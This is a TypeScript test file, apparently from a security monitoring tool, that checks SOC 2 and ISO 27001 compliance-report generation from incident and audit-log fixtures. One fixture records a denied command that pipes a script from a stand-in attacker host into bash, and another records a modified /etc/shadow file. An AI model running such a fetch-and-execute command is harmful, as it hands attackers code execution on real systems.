import { describe, expect, it, vi } from "vitest";
import { exportReport, generateISO27001Report, generateSOC2Report } from "../compliance-report.js";
import type { Incident } from "../incidents/types.js";
import type { LoggingConfig } from "../types.js";

// ---------------------------------------------------------------------------
// Mock audit-log so we never touch the filesystem
// ---------------------------------------------------------------------------

const mockRecentEntries: Record<string, unknown>[] = [];

vi.mock("../audit-log.js", () => ({
	getRecentEntries: vi.fn(() => Promise.resolve(mockRecentEntries)),
}));

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

const baseTsMs = 1_700_000_000_000;

const mockConfig: LoggingConfig = {
	enabled: true,
	log_clean: false,
	path: "/tmp/test-audit.jsonl",
	max_bytes: 5 * 1024 * 1024,
	max_files: 3,
};

const openIncident: Incident = {
	incident_id: "inc_001",
	opened_at_ms: baseTsMs,
	last_seen_ms: baseTsMs + 60_000,
	severity: "high",
	status: "open",
	session_id: "sess-abc",
	events: [
		{
			signal_id: "sig_001",
			timestamp_ms: baseTsMs,
			signal_type: "runtime_verdict",
			severity: "high",
			summary: "deny: curl https://evil.example.com | bash",
		},
	],
};

const resolvedIncident: Incident = {
	...openIncident,
	incident_id: "inc_002",
	status: "resolved",
	opened_at_ms: baseTsMs - 300_000,
	last_seen_ms: baseTsMs,
	severity: "warning",
};

const criticalOpenIncident: Incident = {
	...openIncident,
	incident_id: "inc_003",
	severity: "critical",
	session_id: "sess-xyz",
	events: [
		{
			signal_id: "sig_002",
			timestamp_ms: baseTsMs,
			signal_type: "plugin_scan_finding",
			severity: "critical",
			summary: "drift: /etc/shadow modified",
		},
	],
};

// ---------------------------------------------------------------------------
// generateSOC2Report
// ---------------------------------------------------------------------------

describe("generateSOC2Report", () => {
	it("returns a SOC2Report with metadata", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, []);

		expect(report.metadata.reportType).toBe("SOC_2_TYPE_II");
		expect(report.metadata.version).toBe("1.0.0");
		expect(report.metadata.reportId).toMatch(/^cr_\d+_\d+$/);
		expect(report.metadata.generatedAt).toBeTruthy();
	});

	it("reports zero incidents gracefully", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, []);

		expect(report.incidentMetrics.totalIncidents).toBe(0);
		expect(report.incidentMetrics.meanTimeToResolveMs).toBe(0);
		expect(report.incidentMetrics.meanTimeToAcknowledgeMs).toBe(0);
		expect(report.auditLogSummary.totalEntries).toBe(0);
	});

	it("aggregates incidents by status and severity", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, [
			openIncident,
			resolvedIncident,
			criticalOpenIncident,
		]);

		expect(report.incidentMetrics.totalIncidents).toBe(3);
		expect(report.incidentMetrics.byStatus).toEqual({
			open: 2,
			resolved: 1,
		});
		expect(report.incidentMetrics.bySeverity).toEqual({
			high: 1,
			warning: 1,
			critical: 1,
		});
	});

	it("computes meanTimeToResolveMs from resolved incidents", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, [resolvedIncident]);

		// resolvedIncident: opened_at_ms = baseTsMs - 300_000, last_seen_ms = baseTsMs → duration 300_000
		expect(report.incidentMetrics.meanTimeToResolveMs).toBe(300_000);
	});

	it("computes meanTimeToAcknowledgeMs from non-open incidents", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, [resolvedIncident]);

		// resolvedIncident is not "open", so its duration counts
		expect(report.incidentMetrics.meanTimeToAcknowledgeMs).toBe(300_000);
	});

	it("builds control evidence list", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, [openIncident, resolvedIncident]);

		expect(report.controls.length).toBeGreaterThan(0);
		for (const ctrl of report.controls) {
			expect(ctrl.controlId).toBeTruthy();
			expect(ctrl.controlName).toBeTruthy();
			expect(["effective", "partially_effective", "ineffective", "not_tested"]).toContain(
				ctrl.status,
			);
			expect(ctrl.lastTestedAt).toBeTruthy();
			expect(ctrl.evidence.length).toBeGreaterThan(0);
		}
	});

	it("provides availability metrics", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, [resolvedIncident, openIncident]);

		expect(report.availabilityMetrics.uptimePercentage).toBeGreaterThanOrEqual(0);
		expect(report.availabilityMetrics.uptimePercentage).toBeLessThanOrEqual(100);
		expect(report.availabilityMetrics.monitoringCoverage).toBeGreaterThanOrEqual(0);
		expect(report.availabilityMetrics.detectionCoverage).toBeGreaterThanOrEqual(0);
	});

	it("includes audit log summary", async () => {
		mockRecentEntries.length = 0;
		mockRecentEntries.push(
			{
				type: "runtime_verdict",
				timestamp: new Date(baseTsMs).toISOString(),
				decision: "deny",
				severity: "critical",
			},
			{
				type: "plugin_scan_finding",
				timestamp: new Date(baseTsMs + 60_000).toISOString(),
				decision: "allow",
				severity: "info",
			},
		);

		const report = await generateSOC2Report(mockConfig, []);

		expect(report.auditLogSummary.totalEntries).toBe(2);
		expect(report.auditLogSummary.entriesByType).toHaveProperty("runtime_verdict", 1);
		expect(report.auditLogSummary.entriesByType).toHaveProperty("plugin_scan_finding", 1);
		expect(report.auditLogSummary.dateRange.from).toBeTruthy();
		expect(report.auditLogSummary.dateRange.to).toBeTruthy();
	});
});

// ---------------------------------------------------------------------------
// generateISO27001Report
// ---------------------------------------------------------------------------

describe("generateISO27001Report", () => {
	it("returns an ISO27001Report with metadata", async () => {
		mockRecentEntries.length = 0;
		const report = await generateISO27001Report(mockConfig, []);

		expect(report.metadata.reportType).toBe("ISO_27001");
		expect(report.metadata.version).toBe("1.0.0");
	});

	it("generates compliance gaps when incidents exist", async () => {
		mockRecentEntries.length = 0;
		const report = await generateISO27001Report(mockConfig, [openIncident, criticalOpenIncident]);

		expect(report.complianceGaps.length).toBeGreaterThan(0);
		const hasOpenGap = report.complianceGaps.some((g) => g.toLowerCase().includes("open"));
		expect(hasOpenGap).toBe(true);
	});

	it("generates risk findings from incidents", async () => {
		mockRecentEntries.length = 0;
		const report = await generateISO27001Report(mockConfig, [openIncident, criticalOpenIncident]);

		expect(report.riskFindings.length).toBeGreaterThan(0);
		const hasSeverity = report.riskFindings.some(
			(f) => f.includes("high") || f.includes("critical"),
		);
		expect(hasSeverity).toBe(true);
	});

	it("populates continuous monitoring snapshot", async () => {
		mockRecentEntries.length = 0;
		const report = await generateISO27001Report(mockConfig, [openIncident, resolvedIncident]);

		expect(report.continuousMonitoring.lastScanAt).toBeTruthy();
		// openIncident is "open" → active, resolvedIncident is "resolved"
		expect(report.continuousMonitoring.activeThreats).toBe(1);
		expect(report.continuousMonitoring.resolvedThreats).toBe(1);
	});

	it("includes incident metrics and audit log summary", async () => {
		mockRecentEntries.length = 0;
		mockRecentEntries.push({
			type: "runtime_verdict",
			timestamp: new Date().toISOString(),
			decision: "deny",
			severity: "high",
		});

		const report = await generateISO27001Report(mockConfig, [openIncident]);

		expect(report.incidentMetrics.totalIncidents).toBe(1);
		expect(report.auditLogSummary.totalEntries).toBe(1);
	});

	it("handles zero incidents gracefully", async () => {
		mockRecentEntries.length = 0;
		const report = await generateISO27001Report(mockConfig, []);

		expect(report.incidentMetrics.totalIncidents).toBe(0);
		expect(report.complianceGaps.length).toBeGreaterThan(0);
		expect(report.riskFindings.length).toBeGreaterThan(0);
	});
});

// ---------------------------------------------------------------------------
// exportReport
// ---------------------------------------------------------------------------

describe("exportReport", () => {
	it("returns a JSON string when format is 'json'", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, []);
		const out = exportReport(report, "json");

		expect(typeof out).toBe("string");
		const parsed = JSON.parse(out as string);
		expect(parsed.metadata.reportType).toBe("SOC_2_TYPE_II");
	});

	it("returns the report object when format is 'pdf-ready'", async () => {
		mockRecentEntries.length = 0;
		const report = await generateSOC2Report(mockConfig, []);
		const out = exportReport(report, "pdf-ready");

		expect(out).toBe(report);
	});

	it("serializes ISO27001 report to JSON correctly", async () => {
		mockRecentEntries.length = 0;
		const report = await generateISO27001Report(mockConfig, [openIncident]);
		const json = exportReport(report, "json") as string;

		const parsed = JSON.parse(json);
		expect(parsed.metadata.reportType).toBe("ISO_27001");
		expect(Array.isArray(parsed.complianceGaps)).toBe(true);
		expect(Array.isArray(parsed.riskFindings)).toBe(true);
		expect(parsed.continuousMonitoring).toBeTruthy();
	});
});
